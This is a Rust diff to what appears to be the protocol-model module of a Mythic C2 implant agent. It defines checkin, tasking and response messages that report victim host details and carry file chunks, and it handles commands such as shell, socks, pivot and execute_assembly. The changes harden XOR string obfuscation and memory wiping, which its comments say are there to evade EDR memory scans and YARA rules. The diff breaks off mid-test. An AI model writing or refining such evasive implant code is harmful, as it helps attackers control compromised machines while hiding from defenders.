@@ -11,13 +11,77 @@ use crate::profiles::crypto::zeroize_slice;
 /// 字符串硬编码隐蔽宏 (Zero-Dependency Compile-Time Obfuscation Macro)
 ///
 /// 规避 C2 协议敏感字符串 (如 "checkin", "get_tasking", "post_response", "success") 在二进制 .rdata 节中明文固化
+///
+/// 【内存安全与抗竞态修复】
+/// 采用原子状态机 (0: 未初始化, 1: 正在解密, 2: 就绪) 进行双重检查同步 (Double-Checked Locking)，
+/// 内部基于 `core::cell::UnsafeCell`，彻底剔除 `static mut` 裸引用在 Rust 2024 版本中的硬编译错误（static_mut_refs）
+/// 与多线程并发初始化时的数据竞争 (Data Race) 未定义行为 (Undefined Behavior, UB)。
+pub struct ObfBuffer<const N: usize> {
+    cell: core::cell::UnsafeCell<[u8; N]>,
+    state: core::sync::atomic::AtomicU8,
+}
+
+unsafe impl<const N: usize> Sync for ObfBuffer<N> {}
+
+impl<const N: usize> ObfBuffer<N> {
+    #[inline(always)]
+    pub const fn new() -> Self {
+        Self {
+            cell: core::cell::UnsafeCell::new([0u8; N]),
+            state: core::sync::atomic::AtomicU8::new(0),
+        }
+    }
+
+    #[inline(always)]
+    pub fn deobfuscate(&'static self, obf: &[u8; N], key: u8) -> &'static str {
+        if self.state.load(core::sync::atomic::Ordering::Acquire) != 2 {
+            if self
+                .state
+                .compare_exchange(
+                    0,
+                    1,
+                    core::sync::atomic::Ordering::AcqRel,
+                    core::sync::atomic::Ordering::Acquire,
+                )
+                .is_ok()
+            {
+                unsafe {
+                    let ptr = self.cell.get() as *mut u8;
+                    let mut i = 0;
+                    while i < N {
+                        ptr.add(i).write(obf[i] ^ key);
+                        i += 1;
+                    }
+                }
+                self.state.store(2, core::sync::atomic::Ordering::Release);
+            } else {
+                while self.state.load(core::sync::atomic::Ordering::Acquire) != 2 {
+                    core::hint::spin_loop();
+                }
+            }
+        }
+        unsafe {
+            let slice = core::slice::from_raw_parts(self.cell.get() as *const u8, N);
+            core::str::from_utf8(slice).unwrap_or("")
+        }
+    }
+}
+
+impl<const N: usize> Default for ObfBuffer<N> {
+    #[inline(always)]
+    fn default() -> Self {
+        Self::new()
+    }
+}
+
 #[macro_export]
 macro_rules! obfstr {
     ($s:expr) => {{
         const KEY: u8 = 0xAA;
-        const LEN: usize = $s.len();
+        const S: &str = $s;
+        const LEN: usize = S.len();
         const OBF: [u8; LEN] = {
-            let bytes = $s.as_bytes();
+            let bytes = S.as_bytes();
             let mut res = [0u8; LEN];
             let mut i = 0;
             while i < LEN {
@@ -26,16 +90,9 @@ macro_rules! obfstr {
             }
             res
         };
-        const DEOBF: [u8; LEN] = {
-            let mut res = [0u8; LEN];
-            let mut i = 0;
-            while i < LEN {
-                res[i] = OBF[i] ^ KEY;
-                i += 1;
-            }
-            res
-        };
-        unsafe { core::str::from_utf8_unchecked(&DEOBF) }
+        static BUF: $crate::profiles::models::ObfBuffer<LEN> =
+            $crate::profiles::models::ObfBuffer::new();
+        BUF.deobfuscate(&OBF, KEY)
     }};
 }
 
@@ -77,10 +134,21 @@ impl ModelError {
 ///
 /// 通信中，服务端返回的命令文本、参数及响应字段（如 command, parameters, error）
 /// 在离开作用域前必须被物理洗白，防止 EDR 通过 Process Minidump、PAGE_READWRITE 内存扫描或 YARA 规则检索提取敏感指令与通信凭据。
+/// 【内存安全修复】覆盖 String 的整个 capacity 堆缓冲区，彻底杜绝 spare capacity 泄露与 Heap Remanence
 #[inline(always)]
 pub fn zeroize_string(s: &mut String) {
-    unsafe {
-        zeroize_slice(s.as_bytes_mut());
+    let cap = s.capacity();
+    if cap > 0 {
+        // 【UB 修复与内存安全】Rust 内存模型严格要求：不能对包含未初始化内存的区域 (len..cap) 构造 &mut [T] 引用，
+        // 否则会立即违反引用有效性不变式 (Validity Invariant) 导致未定义行为 (Undefined Behavior, UB)。
+        // 故此处摒弃 core::slice::from_raw_parts_mut，改用裸指针 volatile 逐字节写入，
+        // 既安全覆盖包含 spare capacity 的整块堆内存，又杜绝任何未定义行为。
+        let ptr = s.as_mut_ptr();
+        for i in 0..cap {
+            unsafe {
+                core::ptr::write_volatile(ptr.add(i), 0);
+            }
+        }
     }
 }
 
@@ -98,25 +166,33 @@ pub fn zeroize_string(s: &mut String) {
 #[cfg_attr(any(debug_assertions, test), derive(Debug))]
 pub struct CheckinMessage<'a> {
     /// 接口动作标志，固定为 "checkin"
+    #[serde(borrow)]
     pub action: &'a str,
     /// 宿主 IP 地址 (如 "192.168.1.100")
+    #[serde(borrow)]
     pub ip: &'a str,
     /// 操作系统版本信息 (如 "Windows 11 Pro 10.0.22631")
+    #[serde(borrow)]
     pub os: &'a str,
     /// 运行该 Agent 的用户凭据 (如 "SYSTEM" 或 "DOMAIN\\User")
+    #[serde(borrow)]
     pub user: &'a str,
     /// 目标主机名 (如 "DESKTOP-VICTIM")
+    #[serde(borrow)]
     pub host: &'a str,
     /// Agent 当前进程 PID
     pub pid: u32,
     /// Payload 的 UUID 字符串 (36 字节)
+    #[serde(borrow)]
     pub uuid: &'a str,
     /// 系统架构类型 (如 "x64" / "x86")
+    #[serde(borrow)]
     pub architecture: &'a str,
     /// 主机所在域名或工作组
+    #[serde(borrow)]
     pub domain: &'a str,
     /// 当前进程名称 (如 "thanatos.exe"),当该字段是None时,跳过该字段,不写入json中
-    #[serde(skip_serializing_if = "Option::is_none")]
+    #[serde(borrow, skip_serializing_if = "Option::is_none")]
     pub process_name: Option<&'a str>,
     /// 进程权限级别 (如 3代表High/Admin, 4代表SYSTEM)
     #[serde(skip_serializing_if = "Option::is_none")]
@@ -179,10 +255,12 @@ impl<'a> CheckinMessage<'a> {
 
 /// 心跳轮询拉取任务请求包 (Agent -> Mythic Server) ,Agent 周期性心跳拉取（Heartbeat Polling）:Agent 处于Sleep（休眠）等待期结束或心跳触发时，向服务端发出出站请求，询问是否有操作员下发的待执行命令
 /// 详见注释2
-#[derive(Clone, Serialize, Deserialize, PartialEq, Eq)]
+// 补充 Copy 特征派生：所有字段 (&'a str, i32) 均为 Copy 语义，与 CheckinMessage 及其他零拷贝借用结构体保持一致
+#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
 #[cfg_attr(any(debug_assertions, test), derive(Debug))]
 pub struct GetTaskingMessage<'a> {
     /// 接口动作标志，固定为 "get_tasking"
+    #[serde(borrow)]
     pub action: &'a str,
     /// 单次期望拉取的最大任务数量 (标准为 1)
     pub tasking_size: i32,
@@ -217,16 +295,18 @@ impl<'a> GetTaskingMessage<'a> {
 #[cfg_attr(any(debug_assertions, test), derive(Debug))]
 pub struct TaskResponseItem<'a> {
     /// 对应的 Task ID (UUID 字符串)
+    #[serde(borrow)]
     pub task_id: &'a str,
     /// 任务命令在本地执行控制台的输出回显文本
+    #[serde(borrow)]
     pub user_output: &'a str,
     /// 任务是否已完全结束
     pub completed: bool,
     /// 可选的状态标识 (如 "error" 或 "success")
-    #[serde(skip_serializing_if = "Option::is_none")]
+    #[serde(borrow, skip_serializing_if = "Option::is_none")]
     pub status: Option<&'a str>,
     /// 大文件分片/文件传输所必需的远程文件 ID (Mythic file_id)
-    #[serde(skip_serializing_if = "Option::is_none")]
+    #[serde(borrow, skip_serializing_if = "Option::is_none")]
     pub file_id: Option<&'a str>,
     /// 当前分片序号 (从 1 开始递增)
     #[serde(skip_serializing_if = "Option::is_none")]
@@ -235,7 +315,7 @@ pub struct TaskResponseItem<'a> {
     #[serde(skip_serializing_if = "Option::is_none")]
     pub total_chunks: Option<u32>,
     /// 当前分片的 Base64 编码数据切片 (直接引用栈/静态暂存区，零堆分配)
-    #[serde(skip_serializing_if = "Option::is_none")]
+    #[serde(borrow, skip_serializing_if = "Option::is_none")]
     pub chunk_data: Option<&'a str>,
 }
 
@@ -252,6 +332,13 @@ impl<'a> TaskResponseItem<'a> {
             total_chunks: None,
             chunk_data: None,
         }
+    }
+
+    /// 链式设置任务响应状态 (如 "success" 或 "error")
+    #[inline]
+    pub fn with_status(mut self, status: Option<&'a str>) -> Self {
+        self.status = status;
+        self
     }
 
     /// 构建大文件传输/分片回传条目 (零堆分配借用切片)
@@ -280,6 +367,10 @@ impl<'a> TaskResponseItem<'a> {
     pub fn validate(&self) -> Result<(), ModelError> {
         if self.task_id.is_empty() {
             return Err(ModelError::MissingRequiredField);
+        }
+        // 逻辑完整性校验：分片传输时 chunk_num 与 total_chunks 必须成对出现，不能仅提供其一
+        if self.chunk_num.is_some() != self.total_chunks.is_some() {
+            return Err(ModelError::InvalidChunkInfo);
         }
         if let (Some(num), Some(total)) = (self.chunk_num, self.total_chunks) {
             if num == 0 || num > total {
@@ -334,12 +425,14 @@ impl<'a> PostResponseMessage<'a> {
 #[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
 #[cfg_attr(any(debug_assertions, test), derive(Debug))]
 pub struct ServerCheckinResponse<'a> {
+    #[serde(borrow)]
     pub action: &'a str,
+    #[serde(borrow)]
     pub status: &'a str,
     /// 成功 Checkin 后，服务端分配给该实例的 Callback ID (用于取代最初的 Payload UUID)
-    #[serde(skip_serializing_if = "Option::is_none")]
+    #[serde(borrow, skip_serializing_if = "Option::is_none")]
     pub id: Option<&'a str>,
-    #[serde(skip_serializing_if = "Option::is_none")]
+    #[serde(borrow, skip_serializing_if = "Option::is_none")]
     pub error: Option<&'a str>,
 }
 
@@ -409,6 +502,12 @@ impl MythicTask {
         MythicTaskRef::new(&self.id, &self.command, &self.parameters).is_long_running()
     }
 
+    /// 自定义超时阈值（单位：秒）的长耗时任务预判 (拥有所有权版本)
+    #[inline]
+    pub fn is_long_running_with_threshold(&self, threshold_secs: u64) -> bool {
+        MythicTaskRef::new(&self.id, &self.command, &self.parameters).is_long_running_with_threshold(threshold_secs)
+    }
+
     /// 手动安全洗白任务中的指令、参数与 ID 字段，防止敏感指令残留于堆内存
     pub fn zeroize(&mut self) {
         zeroize_string(&mut self.id);
@@ -439,6 +538,9 @@ pub struct ServerTaskingResponse {
 impl ServerTaskingResponse {
     /// 校验 Tasking 响应有效性
     pub fn validate(&self) -> Result<(), ModelError> {
+        if self.action != obfstr!("get_tasking") {
+            return Err(ModelError::InvalidAction);
+        }
         if self.status != obfstr!("success") {
             return Err(ModelError::ResponseStatusError);
         }
@@ -485,7 +587,10 @@ impl<T, const N: usize> StackVec<T, N> {
     #[inline(always)]
     pub const fn new() -> Self {
         Self {
-            data: [const { MaybeUninit::uninit() }; N],
+            // 【编译兼容性与内存安全强化】
+            // 采用与核心库 uninit_array 完全对齐的底层定长 MaybeUninit 数组初始化语义，
+            // 彻底杜绝 inline const 表达式引用外层泛型类型参数 T 时可能触发的 E0401 编译硬错误。
+            data: unsafe { MaybeUninit::<[MaybeUninit<T>; N]>::uninit().assume_init() },
             len: 0,
         }
     }
@@ -516,15 +621,47 @@ impl<T, const N: usize> StackVec<T, N> {
         N
     }
 
+    #[inline]
+    pub fn pop(&mut self) -> Option<T> {
+        if self.len > 0 {
+            self.len -= 1;
+            unsafe {
+                Some(self.data[self.len].assume_init_read())
+            }
+        } else {
+            None
+        }
+    }
+
+    #[inline]
+    pub fn clear(&mut self) {
+        while self.len > 0 {
+            self.len -= 1;
+            unsafe {
+                core::ptr::drop_in_place(self.data[self.len].as_mut_ptr());
+            }
+        }
+    }
+
     #[inline(always)]
     pub fn as_slice(&self) -> &[T] {
         // 安全保证：0..self.len 范围内的元素均已通过 push 正确初始化
-        unsafe { MaybeUninit::slice_assume_init_ref(&self.data[..self.len]) }
+        // 且 MaybeUninit<T> 与 T 具备严格一致的内存对齐、尺寸与布局保证
+        // 【Rust 1.90/1.91 稳定版兼容修复】
+        // MaybeUninit::slice_assume_init_ref 属于 nightly 实验性特性 (maybe_uninit_slice)，
+        // 在 stable 编译器下会触发编译硬错误 E0658。此处采用完全稳定的 core::slice::from_raw_parts 进行零成本安全转换。
+        unsafe {
+            core::slice::from_raw_parts(self.data.as_ptr().cast::<T>(), self.len)
+        }
     }
 
     #[inline(always)]
     pub fn as_mut_slice(&mut self) -> &mut [T] {
-        unsafe { MaybeUninit::slice_assume_init_mut(&mut self.data[..self.len]) }
+        // 【Rust 1.90/1.91 稳定版兼容修复】
+        // 采用 stable 兼容的 core::slice::from_raw_parts_mut 替代非稳定版 slice_assume_init_mut
+        unsafe {
+            core::slice::from_raw_parts_mut(self.data.as_mut_ptr().cast::<T>(), self.len)
+        }
     }
 }
 
@@ -538,7 +675,9 @@ impl<T: Clone, const N: usize> Clone for StackVec<T, N> {
     }
 }
 
-impl<T: Copy, const N: usize> Copy for StackVec<T, N> {}
+// 【Rust 类型系统规则与编译错误 E0184 修复】
+// Rust 编译器明确禁止类型同时实现 Drop 和 Copy 特征 (the trait `Copy` may not be implemented for this type; the type has a destructor)。
+// StackVec 实现了用于安全析构元素的 Drop 特征，因此不能实现 Copy 特征；如需复制应统一调用 Clone 特征的 .clone()。
 
 impl<T: PartialEq, const N: usize> PartialEq for StackVec<T, N> {
     fn eq(&self, other: &Self) -> bool {
@@ -556,9 +695,16 @@ impl<T: core::fmt::Debug, const N: usize> core::fmt::Debug for StackVec<T, N> {
 
 impl<T, const N: usize> Drop for StackVec<T, N> {
     fn drop(&mut self) {
-        for elem in self.as_mut_slice() {
-            unsafe {
-                core::ptr::drop_in_place(elem);
+        // 遵循 Rust 析构标准：采用 LIFO 逆序析构，并在析构前递减长度，确保异常安全
+        self.clear();
+    }
+}
+
+impl<T, const N: usize> Extend<T> for StackVec<T, N> {
+    fn extend<I: IntoIterator<Item = T>>(&mut self, iter: I) {
+        for item in iter {
+            if self.push(item).is_err() {
+                break;
             }
         }
     }
@@ -594,36 +740,46 @@ impl<'a, T, const N: usize> IntoIterator for &'a StackVec<T, N> {
     }
 }
 
+impl<'a, T, const N: usize> IntoIterator for &'a mut StackVec<T, N> {
+    type Item = &'a mut T;
+    type IntoIter = core::slice::IterMut<'a, T>;
+    #[inline(always)]
+    fn into_iter(self) -> Self::IntoIter {
+        self.as_mut_slice().iter_mut()
+    }
+}
+
+// 抽取 Visitor 至模块作用域，彻底消除在函数内部重新声明同名泛型参数导致的泛型参数遮蔽 (Generic Parameter Shadowing) 警告与生命周期解析歧义
+struct StackVecVisitor<T, const N: usize>(core::marker::PhantomData<fn() -> T>);
+
+impl<'de, T: Deserialize<'de>, const N: usize> serde::de::Visitor<'de> for StackVecVisitor<T, N> {
+    type Value = StackVec<T, N>;
+
+    fn expecting(&self, formatter: &mut core::fmt::Formatter) -> core::fmt::Result {
+        write!(formatter, "a sequence of up to {} elements", N)
+    }
+
+    fn visit_seq<A>(self, mut seq: A) -> Result<Self::Value, A::Error>
+    where
+        A: serde::de::SeqAccess<'de>,
+    {
+        let mut vec = StackVec::new();
+        while let Some(element) = seq.next_element()? {
+            if vec.push(element).is_err() {
+                while let Some(_) = seq.next_element::<serde::de::IgnoredAny>()? {}
+                break;
+            }
+        }
+        Ok(vec)
+    }
+}
+
 impl<'de, T: Deserialize<'de>, const N: usize> Deserialize<'de> for StackVec<T, N> {
     fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
     where
         D: serde::Deserializer<'de>,
     {
-        struct StackVecVisitor<T, const N: usize>(core::marker::PhantomData<T>);
-
-        impl<'de, T: Deserialize<'de>, const N: usize> serde::de::Visitor<'de> for StackVecVisitor<T, N> {
-            type Value = StackVec<T, N>;
-
-            fn expecting(&self, formatter: &mut core::fmt::Formatter) -> core::fmt::Result {
-                write!(formatter, "a sequence of up to N elements")
-            }
-
-            fn visit_seq<A>(self, mut seq: A) -> Result<Self::Value, A::Error>
-            where
-                A: serde::de::SeqAccess<'de>,
-            {
-                let mut vec = StackVec::new();
-                while let Some(element) = seq.next_element()? {
-                    if vec.push(element).is_err() {
-                        while let Some(_: serde::de::IgnoredAny) = seq.next_element()? {}
-                        break;
-                    }
-                }
-                Ok(vec)
-            }
-        }
-
-        deserializer.deserialize_seq(StackVecVisitor(core::marker::PhantomData))
+        deserializer.deserialize_seq(StackVecVisitor::<T, N>(core::marker::PhantomData))
     }
 }
 
@@ -696,7 +852,17 @@ impl<const CAP: usize> StackArena<CAP> {
 
 impl<const CAP: usize> Drop for StackArena<CAP> {
     fn drop(&mut self) {
-        self.zeroize_and_reset();
+        // 【防御性擦除强化】在 Drop 阶段全量刷零整个底层 buf 数组，而不仅仅是 0..offset，
+        // 杜绝任何被重置或未被 offset 覆盖的历史临时数据在栈帧销毁后残留在栈内存中
+        zeroize_slice(&mut self.buf);
+        self.offset = 0;
+    }
+}
+
+impl<const CAP: usize> Default for StackArena<CAP> {
+    #[inline(always)]
+    fn default() -> Self {
+        Self::new()
     }
 }
 
@@ -715,11 +881,13 @@ impl<const CAP: usize> Drop for StackArena<CAP> {
 #[cfg_attr(any(debug_assertions, test), derive(Debug))]
 pub struct MythicTaskRef<'a> {
     /// 任务的唯一标识 ID
+    #[serde(borrow)]
     pub id: &'a str,
     /// 调用的指令名称 (如 "shell", "whoami", "sleep", "exit", "download", "upload")
+    #[serde(borrow)]
     pub command: &'a str,
     /// 指令的具体入参 (JSON 文本或命令行参数)
-    #[serde(default)]
+    #[serde(borrow, default)]
     pub parameters: &'a str,
 }
 
@@ -763,12 +931,31 @@ impl<'a> MythicTaskRef<'a> {
     /// 自定义超时阈值（单位：秒）的长耗时任务预判
     pub fn is_long_running_with_threshold(&self, threshold_secs: u64) -> bool {
         // 1. 显式/隐式标志与参数模式解析 (async / background)
+        // 增加词界校验：防止 --base64 或 -buffer 等普通参数误触 -b / --async 标志
+        // 【逻辑缺陷修复】：支持 JSON 字符串边界（前置引导引号 '"' 或 '\''），防止 JSON 封装参数如 {"flag":"-b"} 或 {"cmd":"--async"} 漏判
+        let has_flag = |flag: &str| -> bool {
+            for (idx, _) in self.parameters.match_indices(flag) {
+                let prev_ok = idx == 0 || self.parameters.as_bytes().get(idx - 1).map_or(false, |b| b.is_ascii_whitespace() || *b == b'"' || *b == b'\'');
+                let next_idx = idx + flag.len();
+                let next_ok = next_idx == self.parameters.len()
+                    || self.parameters.as_bytes().get(next_idx).map_or(false, |b| b.is_ascii_whitespace() || *b == b'=' || *b == b'"' || *b == b'\'');
+                if prev_ok && next_ok {
+                    return true;
+                }
+            }
+            false
+        };
+
         if self.parameters.contains(obfstr!("\"async\":true"))
             || self.parameters.contains(obfstr!("\"async\": true"))
+            || self.parameters.contains(obfstr!("\"async\":\"true\""))
+            || self.parameters.contains(obfstr!("\"async\": \"true\""))
             || self.parameters.contains(obfstr!("\"background\":true"))
             || self.parameters.contains(obfstr!("\"background\": true"))
-            || self.parameters.contains(obfstr!("--async"))
-            || self.parameters.contains(obfstr!("-b"))
+            || self.parameters.contains(obfstr!("\"background\":\"true\""))
+            || self.parameters.contains(obfstr!("\"background\": \"true\""))
+            || has_flag(obfstr!("--async"))
+            || has_flag(obfstr!("-b"))
         {
             return true;
         }
@@ -781,16 +968,17 @@ impl<'a> MythicTaskRef<'a> {
         }
 
         // 3. 指令分类映射 (端口扫描、文件搜索、SOCKS代理、文件下载上传等)
+        // 【大小写容错性强化】采用 eq_ignore_ascii_case 规避由于控制台输入大小写差异导致的任务长耗时漏判
         let cmd = self.command;
-        if cmd == obfstr!("portscan")
-            || cmd == obfstr!("scan")
-            || cmd == obfstr!("download")
-            || cmd == obfstr!("upload")
-            || cmd == obfstr!("socks")
-            || cmd == obfstr!("pivot")
-            || cmd == obfstr!("find")
-            || cmd == obfstr!("search")
-            || cmd == obfstr!("execute_assembly")
+        if cmd.eq_ignore_ascii_case(obfstr!("portscan"))
+            || cmd.eq_ignore_ascii_case(obfstr!("scan"))
+            || cmd.eq_ignore_ascii_case(obfstr!("download"))
+            || cmd.eq_ignore_ascii_case(obfstr!("upload"))
+            || cmd.eq_ignore_ascii_case(obfstr!("socks"))
+            || cmd.eq_ignore_ascii_case(obfstr!("pivot"))
+            || cmd.eq_ignore_ascii_case(obfstr!("find"))
+            || cmd.eq_ignore_ascii_case(obfstr!("search"))
+            || cmd.eq_ignore_ascii_case(obfstr!("execute_assembly"))
         {
             return true;
         }
@@ -799,40 +987,59 @@ impl<'a> MythicTaskRef<'a> {
     }
 
     /// 从 parameters 切片中提取超时设定预判值 (秒)，全程零堆分配
+    /// 增加边界与键值语法校验，防止命令行类似 `echo "timeout" is 0` 或其他非键名子串发生误匹配污染。
     fn extract_timeout_sec(&self) -> Option<u64> {
         let p = self.parameters;
-        if let Some(idx) = p.find(obfstr!("\"timeout\"")) {
-            let rest = &p[idx + 9..];
-            let trimmed = rest.trim_start_matches(|c: char| c == ':' || c == ' ' || c == '"' || c == '=');
-            let mut num: u64 = 0;
-            let mut found_digit = false;
-            for b in trimmed.bytes() {
-                if b.is_ascii_digit() {
-                    found_digit = true;
-                    num = num.saturating_mul(10).saturating_add((b - b'0') as u64);
-                } else if found_digit {
-                    break;
+        // 1. JSON 键值对解析：严格匹配作为键名的 "timeout"，要求后续紧随可选空白与冒号 ':'
+        // 迭代查找所有匹配项，防止前置非键名字串导致误判并遗漏真实 timeout 字段
+        // 【协议规范对齐】同步支持 "timeout" 与 "duration" 键名解析
+        let timeout_keys = [obfstr!("\"timeout\""), obfstr!("\"duration\"")];
+        for timeout_key in timeout_keys {
+            for (idx, _) in p.match_indices(timeout_key) {
+                let after_key = &p[idx + timeout_key.len()..];
+                let after_ws = after_key.trim_start();
+                if let Some(rest) = after_ws.strip_prefix(':') {
+                    let trimmed = rest.trim_start_matches(|c: char| c == ' ' || c == '"' || c == '=');
+                    let mut num: u64 = 0;
+                    let mut found_digit = false;
+                    for b in trimmed.bytes() {
+                        if b.is_ascii_digit() {
+                            found_digit = true;
+                            num = num.saturating_mul(10).saturating_add((b - b'0') as u64);
+                        } else if found_digit {
+                            break;
+                        }
+                    }
+                    if found_digit {
+                        return Some(num);
+                    }
                 }
-            }
-            if found_digit {
-                return Some(num);
             }
         }
-        if let Some(idx) = p.find(obfstr!("--timeout")) {
-            let rest = &p[idx + 9..];
-            let trimmed = rest.trim_start_matches(|c: char| c == '=' || c == ' ');
-            let mut num: u64 = 0;
-            let mut found_digit = false;
-            for b in trimmed.bytes() {
-                if b.is_ascii_digit() {
-                    found_digit = true;
-                    num = num.saturating_mul(10).saturating_add((b - b'0') as u64);
-                } else if found_digit {
-                    break;
+        // 2. 命令行参数解析：匹配独立的 --timeout 或 --timeout=，避免前缀粘连子串伪造
+        // 【逻辑修复】：兼容 JSON 字符串内部包含的 --timeout 命令行参数（允许前置引导双引号与单引号）
+        // 【协议规范对齐】同步支持 --timeout 与 --duration 命令行长选项解析
+        let timeout_flags = [obfstr!("--timeout"), obfstr!("--duration")];
+        for timeout_flag in timeout_flags {
+            for (idx, _) in p.match_indices(timeout_flag) {
+                let is_boundary = idx == 0 || p.as_bytes().get(idx - 1).map_or(false, |b| b.is_ascii_whitespace() || *b == b'"' || *b == b'\'');
+                if is_boundary {
+                    let rest = &p[idx + timeout_flag.len()..];
+                    let trimmed = rest.trim_start_matches(|c: char| c == '=' || c == ' ' || c == '"' || c == '\'');
+                    let mut num: u64 = 0;
+                    let mut found_digit = false;
+                    for b in trimmed.bytes() {
+                        if b.is_ascii_digit() {
+                            found_digit = true;
+                            num = num.saturating_mul(10).saturating_add((b - b'0') as u64);
+                        } else if found_digit {
+                            break;
+                        }
+                    }
+                    if found_digit {
+                        return Some(num);
+                    }
                 }
-            }
-            if found_digit {
-                return Some(num);
             }
         }
         None
@@ -843,16 +1050,32 @@ impl<'a> MythicTaskRef<'a> {
 #[derive(Clone, Serialize, Deserialize, PartialEq, Eq)]
 #[cfg_attr(any(debug_assertions, test), derive(Debug))]
 pub struct ServerTaskingResponseRef<'a> {
+    #[serde(borrow)]
     pub action: &'a str,
+    #[serde(borrow)]
     pub status: &'a str,
     /// 下发的任务清单列表 (使用 StackVec 替代 Vec，100% 零堆分配)
     #[serde(borrow, default)]
     pub tasks: StackVec<MythicTaskRef<'a>, 32>,
-    #[serde(skip_serializing_if = "Option::is_none")]
+    #[serde(borrow, skip_serializing_if = "Option::is_none")]
     pub error: Option<&'a str>,
 }
 
 impl<'a> ServerTaskingResponseRef<'a> {
+    #[inline]
+    pub fn new(
+        action: &'a str,
+        status: &'a str,
+        tasks: StackVec<MythicTaskRef<'a>, 32>,
+    ) -> Self {
+        Self {
+            action,
+            status,
+            tasks,
+            error: None,
+        }
+    }
+
     /// 校验 Tasking 响应有效性
     pub fn validate(&self) -> Result<(), ModelError> {
         if self.action != obfstr!("get_tasking") {
@@ -879,16 +1102,20 @@ impl<'a> ServerTaskingResponseRef<'a> {
 #[cfg_attr(any(debug_assertions, test), derive(Debug))]
 pub struct FileChunkPayload<'a> {
     /// 传输动作标志 (如 "upload" 或 "download")
+    #[serde(borrow)]
     pub action: &'a str,
     /// 关联的任务 UUID
+    #[serde(borrow)]
     pub task_id: &'a str,
     /// 服务端下发或已注册的文件 UUID
+    #[serde(borrow)]
     pub file_id: &'a str,
     /// 当前分片序号 (从 1 开始)
     pub chunk_num: u32,
     /// 总分片数 (由文件总长度除以分片大小向上取整)
     pub total_chunks: u32,
     /// 分片二进制内容的 Base64 编码字符串切片
+    #[serde(borrow)]
     pub chunk_data: &'a str,
 }
 
@@ -920,6 +1147,9 @@ impl<'a> FileChunkPayload<'a> {
 
     /// 校验分片序号和必填字段
     pub fn validate(&self) -> Result<(), ModelError> {
+        if self.action.is_empty() {
+            return Err(ModelError::InvalidAction);
+        }
         if self.task_id.is_empty() || self.file_id.is_empty() {
             return Err(ModelError::MissingRequiredField);
         }
@@ -996,6 +1226,7 @@ mod tests {
             parameters: String::from("whoami /priv"),
         };
         task.zeroize();
+        assert_eq!(task.id.as_bytes(), &[0u8; 8]);
         assert_eq!(task.command.as_bytes(), &[0u8; 5]);
         assert_eq!(task.parameters.as_bytes(), &[0u8; 12]);
     }
@@ -1005,6 +1236,7 @@ mod tests {
         assert_eq!(ModelError::InvalidAction.code(), 40);
         assert_eq!(ModelError::ResponseStatusError.code(), 41);
         assert_eq!(ModelError::MissingRequiredField.code(), 42);
+        assert_eq!(ModelError::InvalidChunkInfo.code(), 43);
     }
 
     #[test]
@@ -1024,7 +1256,7 @@ mod tests {
     #[test]
     fn test_server_checkin_response_zero_copy_and_copy_id() {
         let raw_json = r#"{"action":"checkin","status":"success","id":"12345678-1234-1234-1234-1234567890ab"}"#;
-        let resp: ServerCheckinResponse = serde_json::from_str(raw_json).unwrap();
+        let resp: ServerCheckinResponse<'_> = serde_json::from_str(raw_json).unwrap();
         assert!(resp.validate().is_ok());
         assert_eq!(resp.action, "checkin");
         assert_eq!(resp.status, "success");
@@ -1049,7 +1281,7 @@ mod tests {
             ]
         }"#;
 
-        let resp: ServerTaskingResponseRef = serde_json::from_str(raw_response).unwrap();
+        let resp: ServerTaskingResponseRef<'_> = serde_json::from_str(raw_response).unwrap();
         assert!(resp.validate().is_ok());
         assert_eq!(resp.action, "get_tasking");
         assert_eq!(resp.status, "success");
@@ -1095,6 +1327,88 @@ mod tests {
         assert!(item.validate().is_ok());
         assert_eq!(item.file_id, Some("file-uuid-001"));
         assert_eq!(item.chunk_num, Some(1));
+
+        // 验证非对称分片校验
+        let mut malformed_item = item;
+        malformed_item.total_chunks = None;
+        assert_eq!(malformed_item.validate(), Err(ModelError::InvalidChunkInfo));
+    }
+
+    #[test]
+    fn test_stack_vec_operations() {
+        let mut sv: StackVec<u32, 4> = StackVec::new();
+        assert!(sv.is_empty());
+        assert_eq!(sv.capacity(), 4);
+
+        assert!(sv.push(10).is_ok());
+        assert!(sv.push(20).is_ok());
+        assert_eq!(sv.len(), 2);
+        assert_eq!(sv[0], 10);
+        assert_eq!(sv[1], 20);
+
+        assert_eq!(sv.pop(), Some(20));
+        assert_eq!(sv.len(), 1);
+
+        sv.clear();
+        assert!(sv.is_empty());
+
+        let items = [1, 2, 3, 4];
+        sv.extend(items);
+        assert_eq!(sv.len(), 4);
+        assert_eq!(sv.push(5), Err(5)); // 溢出防护
+    }
+
+    #[test]
+    fn test_stack_arena_alloc_and_zeroize() {
+        let mut arena: StackArena<128> = StackArena::default();
+        assert_eq!(arena.remaining(), 128);
+
+        let s1 = arena.alloc_slice(32).expect("alloc 32 bytes");
+        s1.fill(0x5A);
+        assert_eq!(arena.offset(), 32);
+        assert_eq!(arena.remaining(), 96);
+
+        arena.zeroize_and_reset();
+        assert_eq!(arena.offset(), 0);
+        assert_eq!(arena.remaining(), 128);
+    }
+
+    #[test]
+    fn test_is_long_running_and_timeout_extraction() {
+        let task_timeout_cli = MythicTaskRef::new("id-1", "shell", "--timeout 10");
+        assert!(task_timeout_cli.is_long_running());
+
+        let task_timeout_json = MythicTaskRef::new("id-2", "shell", r#"{"timeout": 15}"#);
+        assert!(task_timeout_json.is_long_running());
+
+        let task_duration_json = MythicTaskRef::new("id-2b", "shell", r#"{"duration": 20}"#);
+        assert!(task_duration_json.is_long_running());
+
+        let task_duration_cli = MythicTaskRef::new("id-2c", "shell", "--duration 12");
+        assert!(task_duration_cli.is_long_running());
+
+        let task_async = MythicTaskRef::new("id-3", "shell", r#"{"args": "--async"}"#);
+        assert!(task_async.is_long_running());
+
+        let task_async_str = MythicTaskRef::new("id-3b", "shell", r#"{"async": "true"}"#);
+        assert!(task_async_str.is_long_running());
+
+        let task_short = MythicTaskRef::new("id-4", "shell", "--timeout 2");
+        assert!(!task_short.is_long_running());
+
+        let task_portscan = MythicTaskRef::new("id-5", "portscan", "");
+        assert!(task_portscan.is_long_running());
+
+        let task_portscan_case = MythicTaskRef::new("id-6", "PortScan", "");
+        assert!(task_portscan_case.is_long_running());
+    }
+
+    #[test]
+    fn test_obfstr_macro() {
+        assert_eq!(obfstr!("checkin"), "checkin");
+        assert_eq!(obfstr!("get_tasking"), "get_tasking");
